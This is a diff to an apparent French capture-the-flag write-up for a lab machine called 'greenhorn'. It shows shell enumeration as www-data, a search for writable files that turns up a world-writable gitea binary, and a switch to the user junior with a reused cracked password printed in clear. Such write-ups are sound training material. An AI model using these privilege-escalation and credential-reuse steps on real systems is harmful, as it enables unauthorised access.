@@ -329,8 +329,82 @@ dr-xr-xr-x  13 root root     0 Jul 25 02:41 sys
 drwxrwxrwt  12 root root  4096 Jul 25 02:55 tmp
 drwxr-xr-x  14 root root  4096 Jun 20 06:36 usr
 drwxr-xr-x  13 root root  4096 Jun 20 06:36 var
-www-data@greenhorn:/$ 
-
 ```
 
+Dans `/home` on trouve le répertoire `junior` qui contient un fichier `user.txt` (probablement le flag user):
+```bash
+www-data@greenhorn:/$ ls -la /home
+ls -la /home
+total 16
+drwxr-xr-x  4 root   root   4096 Jun 20 06:36 .
+drwxr-xr-x 20 root   root   4096 Jun 20 07:06 ..
+drwxr-x---  2 git    git    4096 Jun 20 06:36 git
+drwxr-xr-x  3 junior junior 4096 Jun 20 06:36 junior
+www-data@greenhorn:/$ ls -la /home/junior
+ls -la /home/junior
+total 76
+drwxr-xr-x 3 junior junior  4096 Jun 20 06:36 .
+drwxr-xr-x 4 root   root    4096 Jun 20 06:36 ..
+lrwxrwxrwx 1 junior junior     9 Jun 11 14:38 .bash_history -> /dev/null
+drwx------ 2 junior junior  4096 Jun 20 06:36 .cache
+-rw-r----- 1 root   junior 61367 Jun 11 14:39 Using OpenVAS.pdf
+-rw-r----- 1 root   junior    33 Jul 25 02:48 user.txt
+```
+
+Il faudrait donc réussir à se connecter avec l'utilisateur `junior` pour voir le flag.
+
+On regarde les fichiers sur lesquels nous avons des droits d'écriture:
+```bash
+www-data@greenhorn:/$ find / -writable -type f 2>/dev/null
+find / -writable -type f 2>/dev/null
+...
+/usr/local/bin/gitea
+...
+```
+
+On semble pouvoir écrire sur le fichier gitea.
+En examinant les permissions sur le fichier, on dirait que junior a installé gitea mais a mal configuré les permissions:
+```bash
+www-data@greenhorn:/$ ls -la /usr/local/bin/gitea
+ls -la /usr/local/bin/gitea
+-rwxrwxrwx 1 junior junior 138332624 Apr 16 03:44 /usr/local/bin/gitea
+```
+
+Puisque c'est lui qui a configuré gitea et que selon le commit c'est lui qui a uploadé le fichier `pass.php` que nous avons cracké plus tôt, on réessaye le même mot de passe, `iloveyou1`:
+```bash
+www-data@greenhorn:/$ su junior
+su junior
+Password: iloveyou1
+whoami
+junior
+ls -la
+total 76
+drwxr-xr-x  20 root root  4096 Jun 20 07:06 .
+drwxr-xr-x  20 root root  4096 Jun 20 07:06 ..
+lrwxrwxrwx   1 root root     7 Feb 16 18:37 bin -> usr/bin
+drwxr-xr-x   4 root root  4096 Jul 15 05:51 boot
+dr-xr-xr-x   2 root root  4096 Jun 20 06:36 cdrom
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 data
+drwxr-xr-x  20 root root  4020 Jul 25 02:41 dev
+drwxr-xr-x 107 root root  4096 Jul 15 05:42 etc
+drwxr-xr-x   4 root root  4096 Jun 20 06:36 home
+lrwxrwxrwx   1 root root     7 Feb 16 18:37 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Feb 16 18:37 libx32 -> usr/libx32
+drwx------   2 root root 16384 Apr 10 23:33 lost+found
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 media
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 mnt
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 opt
+dr-xr-xr-x 294 root root     0 Jul 25 02:41 proc
+drwx------   5 root root  4096 Jul 25 02:48 root
+drwxr-xr-x  28 root root   820 Jul 25 03:32 run
+lrwxrwxrwx   1 root root     8 Feb 16 18:37 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 srv
+dr-xr-xr-x  13 root root     0 Jul 25 02:41 sys
+drwxrwxrwt  12 root root  4096 Jul 25 03:09 tmp
+drwxr-xr-x  14 root root  4096 Jun 20 06:36 usr
+drwxr-xr-x  13 root root  4096 Jun 20 06:36 var
+
+```
 
